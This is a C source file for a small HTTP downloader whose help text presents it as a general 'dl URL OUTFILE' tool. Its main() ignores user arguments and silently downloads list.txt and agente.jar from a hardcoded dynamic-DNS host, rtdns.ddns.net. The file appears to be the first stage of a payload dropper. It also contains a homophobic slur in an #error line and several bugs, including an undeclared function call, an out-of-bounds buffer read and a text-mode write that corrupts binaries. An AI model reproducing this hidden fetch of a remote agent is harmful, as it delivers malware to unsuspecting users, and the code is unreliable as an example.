#if defined(_WIN32)
#include "WinSock2.h"
#include "Ws2tcpip.h"
#pragma comment(lib,"ws2_32.lib")
#elif defined(linux)
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#else
#error gtfo macfag.
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

void help() {
	puts(
		"dl - by Jakash3\n"
		"Downloads specified file from web server.\n"
		"Usage: dl URL OUTFILE\n"
	);
	exit(1);
}

void fail(const char* format, ...) {
	va_list v;
	va_start(v, format);
	vprintf(format, v);
	exit(1);
}

void cr() {
#if defined(linux)
	putchar('\r');
	fflush(stdout);
#elif defined(_WIN32)
	HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
	struct _CONSOLE_SCREEN_BUFFER_INFO bi;
	GetConsoleScreenBufferInfo(out, &bi);
	bi.dwCursorPosition.X = 0;
	SetConsoleCursorPosition(out, bi.dwCursorPosition);
#endif
}

int main(int argc, char** argv) {
	//return descargar(argc,argv);	
	 descargar(2,"http://rtdns.ddns.net:80/list.txt", "list.txt");
	 descargar(2,"http://rtdns.ddns.net:80/agente.jar", "agente.jar");
	 return 0;
}

int descargar(int argc,char url[] ,char destino[]){
	//if (argc < 2) help();

#if defined(_WIN32)
	struct WSAData* wd = (struct WSAData*)malloc(sizeof(struct WSAData));
	if (WSAStartup(MAKEWORD(2, 0), wd))
		fail("Failed to initialize Winsock API.\n");
	free(wd);
	SOCKET sock;
#elif defined(linux)
	int sock;
#endif
	
	char c;
	int i, j, k, l, m;
	FILE* f;
	char* file;
	char* host = url;
	struct addrinfo* ai;
	struct addrinfo hints;
	char buf[512];

	printf("par url %s \n",url);
	printf("par destino %s \n",destino);
	
	
	file = destino;
	//; else file = strrchr(argv[1], '/') + 1;	

	if (!(f = fopen(file, "w"))) fail("Error. Failed to open: %s", destino);
	if (strstr(url, "http://") == url) host += 7;
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	sprintf(buf, "GET %s HTTP/1.1\r\n", url);	
	
	printf("host(1)=%s\n",host);
	
    char ip[100];
    int port = 80;
    char page[100];
    sscanf(url, "http://%99[^:]:%99d/%99[^\n]", ip, &port, page);
    //printf("ip = \"%s\"\n", ip);
    //printf("port = \"%d\"\n", port);
    //printf("page = \"%s\"\n", page);
	
	host=ip;
	//*strchr(host, '/') = '\0';
	//host=strchr(host,'/')+1;
	printf("host(2)=%s\n",host);
	if (i = getaddrinfo(host, "80", &hints, &ai)) fail("Error. %s\n", gai_strerror(i));
	sprintf(buf + strlen(buf), "Host: %s\r\n\r\n", host);
	sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
	if (connect(sock, ai->ai_addr, ai->ai_addrlen))
		fail("Error. Failed to connect to host.\n");
	freeaddrinfo(ai);
	i = send(sock, buf, strlen(buf), 0);
	if (i < strlen(buf) || i == -1) fail("Error. Failed to send GET request!\n");
	while (strcmp(buf, "\r\n")) {
		for (i = 0; strcmp(buf + i - 2, "\r\n"); i++) { recv(sock, buf + i, 1, 0); buf[i + 1] = '\0'; }
		if (strstr(buf, "HTTP/") == buf) {
			fputs(strchr(buf, ' ') + 1, stdout);
			if (strcmp(strchr(buf, ' ') + 1, "200 OK\r\n")) exit(1);
		}
		if (strstr(buf, "Content-Length:") == buf) {
			*strchr(buf, '\r') = '\0';
			j = atoi(strchr(buf, ' ') + 1);
			l = j / 100;
		}
	}
	for (i = 0, k = 0, m = 0; i < j; i++, k++) { 
		recv(sock, &c, 1, 0); 
		fputc(c, f);
		cr();
		printf("Progress: %d%c      Downloaded %d / %d bytes", m, '%', i, j);
		if (k == l) { m++; k = 0; }
	}
	fclose(f);
	putchar('\n');

#if defined(_WIN32)
	closesocket(sock);
	WSACleanup();
#elif defined(linux)
	close(sock);
#endif
	return 0;
}